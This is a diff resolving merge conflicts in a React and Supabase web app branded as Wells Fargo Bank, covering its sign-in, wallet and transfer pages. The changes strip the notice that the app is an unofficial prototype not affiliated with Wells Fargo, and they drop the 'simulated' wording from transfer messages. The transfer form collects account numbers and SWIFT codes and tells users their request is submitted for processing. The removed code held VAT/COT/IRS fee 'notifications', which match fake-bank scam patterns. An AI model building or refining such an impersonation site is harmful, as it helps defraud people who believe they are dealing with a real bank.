@@ -97,11 +97,7 @@ function AuthForm({ onAuthenticated }) {
       {mode !== 'signin' && <button onClick={() => { setMode('signin'); setError(''); setMessage('') }}>Back to sign in</button>}
     </div>
     <p className="fine"><Icon name="shield" /> Never share your password or one-time codes with anyone.</p>
-<<<<<<< HEAD
-    <p className="fine">Unofficial prototype, not affiliated with or endorsed by Wells Fargo. Do not use this application for real banking.</p>
-=======
     
->>>>>>> fd0ec22 (changes)
   </section></main>
 }
 
@@ -165,15 +161,6 @@ function Transactions({ transactions }) {
 
 
 
-<<<<<<< HEAD
-function Transfers({
-  userId,
-  transferNotification,
-  onTransferComplete,
-  onRefresh,
-  refreshing,
-}) {
-=======
 function Wallet({ wallet, onRefresh, refreshing, setPage }) {
   return <main className="container app-page">
     <Title
@@ -224,7 +211,6 @@ function Wallet({ wallet, onRefresh, refreshing, setPage }) {
 }
 
 function Transfers({ userId, onTransferComplete, onRefresh, refreshing }) {
->>>>>>> fd0ec22 (changes)
   const [fullName, setFullName] = useState('')
   const [bankName, setBankName] = useState('')
   const [accountNumber, setAccountNumber] = useState('')
@@ -271,14 +257,9 @@ function Transfers({ userId, onTransferComplete, onRefresh, refreshing }) {
       setError('Complete all required fields before continuing.')
       return
     }
-<<<<<<< HEAD
-    if (beneficiary.full_name.length < 2 || beneficiary.full_name.length > 150) {
-      setError('Enter a valid beneficiary full name.')
-=======
 
     if (beneficiary.full_name.length < 2 || beneficiary.full_name.length > 150) {
       setError('Enter a valid full name.')
->>>>>>> fd0ec22 (changes)
       return
     }
     if (beneficiary.bank_name.length > 150) {
@@ -304,12 +285,6 @@ function Transfers({ userId, onTransferComplete, onRefresh, refreshing }) {
 
     const numericAmount = Number(amount)
     const amountMinor = Math.round(numericAmount * 100)
-<<<<<<< HEAD
-    if (!Number.isSafeInteger(amountMinor) || amountMinor <= 0) {
-      setError('Enter an amount with no more than two decimal places.')
-      return
-    }
-=======
 
     if (!Number.isFinite(numericAmount) || numericAmount <= 0 ||
         !Number.isSafeInteger(amountMinor) ||
@@ -318,7 +293,6 @@ function Transfers({ userId, onTransferComplete, onRefresh, refreshing }) {
       return
     }
 
->>>>>>> fd0ec22 (changes)
     if (!userId) {
       setError('Your session has expired. Sign in again before submitting.')
       return
@@ -326,15 +300,6 @@ function Transfers({ userId, onTransferComplete, onRefresh, refreshing }) {
 
     setBusy(true)
     try {
-<<<<<<< HEAD
-      const requestStatus = mode === 'support'
-        ? 'support_notice'
-        : mode === 'review'
-          ? 'under_review'
-          : 'submitted'
-
-=======
->>>>>>> fd0ec22 (changes)
       const { error: insertError } = await supabase
         .from('beneficiary_transfer_requests')
         .insert({
@@ -342,42 +307,13 @@ function Transfers({ userId, onTransferComplete, onRefresh, refreshing }) {
           ...beneficiary,
           amount_minor: amountMinor,
           currency: 'USD',
-<<<<<<< HEAD
-          notification_mode: mode,
-          notification_category: category,
-          request_status: requestStatus,
-=======
           notification_mode: 'normal',
           notification_category: 'VAT',
           request_status: 'submitted',
->>>>>>> fd0ec22 (changes)
         })
 
       if (insertError) throw insertError
 
-<<<<<<< HEAD
-      if (mode === 'support') {
-        setMessage(
-          `Please contact customer support regarding your ${category} enquiry. ` +
-          'Never share passwords, PINs, or verification codes.'
-        )
-      } else if (mode === 'review') {
-        setMessage(
-          'Your simulated transfer request has been recorded for review. ' +
-          'No real bank transfer has been initiated.'
-        )
-      } else {
-        setMessage(
-          'Your simulated beneficiary request has been saved. ' +
-          'No real bank transfer has been initiated and no internal wallet funds were moved.'
-        )
-      }
-
-      resetForm()
-      await onTransferComplete()
-    } catch (err) {
-      setError(err?.message || 'Unable to save your simulated transfer request. Please try again.')
-=======
       setMessage(
         'Your beneficiary transfer request has been submitted for processing. ' +
         'No real bank transfer has been initiated by this application.'
@@ -392,7 +328,6 @@ function Transfers({ userId, onTransferComplete, onRefresh, refreshing }) {
       await onTransferComplete()
     } catch (err) {
       setError(err?.message || 'Unable to submit the beneficiary request. Please try again.')
->>>>>>> fd0ec22 (changes)
     } finally {
       setBusy(false)
     }
@@ -402,14 +337,8 @@ function Transfers({ userId, onTransferComplete, onRefresh, refreshing }) {
     <Title
       eyebrow="TRANSFER REQUESTS"
       title="Transfer funds"
-<<<<<<< HEAD
-      description="Enter the beneficiary details for a simulated transfer request."
-    />
-
-=======
       description="Enter the beneficiary bank details and amount for your transfer request."
     />
->>>>>>> fd0ec22 (changes)
     <section className="panel transfer-panel">
       <div className="panel-heading">
         <div>
@@ -417,67 +346,6 @@ function Transfers({ userId, onTransferComplete, onRefresh, refreshing }) {
           <p>All fields are required.</p>
         </div>
       </div>
-<<<<<<< HEAD
-
-      <form className="auth-fields transfer-fields" onSubmit={submit}>
-        <label>
-          Full name as on bank account
-          <input value={fullName} onChange={e => setFullName(e.target.value)} autoComplete="name" maxLength={150} required />
-        </label>
-        <label>
-          Bank name
-          <input value={bankName} onChange={e => setBankName(e.target.value)} maxLength={150} required />
-        </label>
-        <label>
-          Account number
-          <input value={accountNumber} onChange={e => setAccountNumber(e.target.value)} autoComplete="off" maxLength={34} required />
-        </label>
-        <label>
-          SWIFT / BIC code
-          <input value={swiftBic} onChange={e => setSwiftBic(e.target.value.toUpperCase())} autoComplete="off" maxLength={11} required />
-        </label>
-        <label>
-          Bank address
-          <input value={bankAddress} onChange={e => setBankAddress(e.target.value)} maxLength={300} required />
-        </label>
-        <label>
-          Country
-          <input value={country} onChange={e => setCountry(e.target.value)} autoComplete="country-name" maxLength={100} required />
-        </label>
-        <label>
-          Transfer amount (USD)
-          <input type="number" min="0.01" step="0.01" inputMode="decimal" value={amount} onChange={e => setAmount(e.target.value)} required />
-        </label>
-
-        {error && <p className="error" role="alert">{error}</p>}
-        {message && <p className="success" role="status">{message}</p>}
-
-        <button className="button red" disabled={busy}>
-          {busy ? 'Saving request…' : 'Send'}
-        </button>
-      </form>
-
-      <p className="fine">
-        Unofficial prototype: these details create a simulated request only.
-        They do not initiate a real bank transfer or move money through a banking network.
-      </p>
-    </section>
-
-    <section className="panel">
-      <div className="panel-heading">
-        <div>
-          <h2>Recent activity</h2>
-          <p>Internal ledger activity remains separate from beneficiary requests.</p>
-        </div>
-        <button className="text-link" onClick={onRefresh} disabled={refreshing}>
-          <Icon name="refresh" /> {refreshing ? 'Refreshing…' : 'Refresh'}
-        </button>
-      </div>
-      <p className="muted">
-        Saving a beneficiary request does not create a completed internal ledger transaction.
-      </p>
-    </section>
-=======
       <form className="auth-fields transfer-fields" onSubmit={submit}>
         <label>
           Full Name as on bank account
@@ -533,7 +401,6 @@ function Transfers({ userId, onTransferComplete, onRefresh, refreshing }) {
         </button>
       </div>
     </section>
->>>>>>> fd0ec22 (changes)
   </main>
 }
 
@@ -580,11 +447,6 @@ export default function App() {
   const [customerAccount, setCustomerAccount] = useState(null)
   const [accounts, setAccounts] = useState([])
   const [transactions, setTransactions] = useState([])
-<<<<<<< HEAD
-  const [wallet, setWallet] = useState(null)
-  const [transferNotification, setTransferNotification] = useState({ mode: 'support', category: 'VAT' })
-=======
->>>>>>> fd0ec22 (changes)
   const [internalTransactions, setInternalTransactions] = useState([])
   const [wallet, setWallet] = useState(null)
   const [loading, setLoading] = useState(isSupabaseConfigured)
@@ -641,25 +503,6 @@ export default function App() {
       setProfile(profileResult.data)
       setCustomerAccount(customerResult.data)
 
-<<<<<<< HEAD
-      const { data: notificationSetting, error: notificationError } = await supabase
-        .from('app_settings')
-        .select('value')
-        .eq('key', 'transfer_notification')
-        .maybeSingle()
-
-      if (notificationError) throw notificationError
-
-      const savedNotification = notificationSetting?.value || {}
-      setTransferNotification({
-        mode: ['support', 'review', 'normal'].includes(savedNotification.mode)
-          ? savedNotification.mode
-          : 'support',
-        category: ['VAT', 'COT', 'IRS'].includes(savedNotification.category)
-          ? savedNotification.category
-          : 'VAT',
-      })
-=======
       const { data: walletData, error: walletError } =
         await supabase.rpc('get_my_internal_wallet')
 
@@ -668,7 +511,6 @@ export default function App() {
       setWallet(
         Array.isArray(walletData) ? (walletData[0] || null) : walletData
       )
->>>>>>> fd0ec22 (changes)
 
       const accountRows = accountResult.data || []
       setAccounts(accountRows)
@@ -709,11 +551,7 @@ export default function App() {
       setAccounts([])
       setTransactions([])
       setInternalTransactions([])
-<<<<<<< HEAD
-      setTransferNotification({ mode: 'support', category: 'VAT' })
-=======
       setWallet(null)
->>>>>>> fd0ec22 (changes)
       setPasswordRecovery(false)
     }
   }
@@ -732,12 +570,8 @@ export default function App() {
 
   return <div className="app-shell"><CustomerHeader page={page} setPage={setPage} user={session.user} signOut={signOut} onRefresh={loadCustomerData} refreshing={dataLoading} />
     {dataError && <div className="container"><p className="error" role="alert">Unable to load account data: {dataError}. Use Refresh data to retry, or contact support if the problem continues.</p></div>}
-<<<<<<< HEAD
-    {page === 'accounts' ? <Accounts customerAccount={customerAccount} accounts={accounts} /> : page === 'transactions' ? <Transactions transactions={allTransactions} /> : page === 'transfers' ? <Transfers userId={session.user.id} transferNotification={transferNotification} onTransferComplete={loadCustomerData} onRefresh={loadCustomerData} refreshing={dataLoading} /> : <Overview profile={profile} customerAccount={customerAccount} accounts={accounts} transactions={allTransactions} setPage={setPage} />}
-=======
     {page === 'accounts' ? <Accounts customerAccount={customerAccount} accounts={accounts} /> : page === 'wallet' ? <Wallet wallet={wallet} onRefresh={loadCustomerData} refreshing={dataLoading} setPage={setPage} /> : page === 'transactions' ? <Transactions transactions={allTransactions} /> : page === 'transfers' ? <Transfers userId={session.user.id} onTransferComplete={loadCustomerData} onRefresh={loadCustomerData} refreshing={dataLoading} /> : <Overview profile={profile} customerAccount={customerAccount} accounts={accounts} transactions={allTransactions} setPage={setPage} />}
     <SupportWidget user={session.user} />
->>>>>>> fd0ec22 (changes)
     <footer className="footer"><div className="container footer-bottom"><span>Wells Fargo Bank</span></div></footer>
   </div>
 }
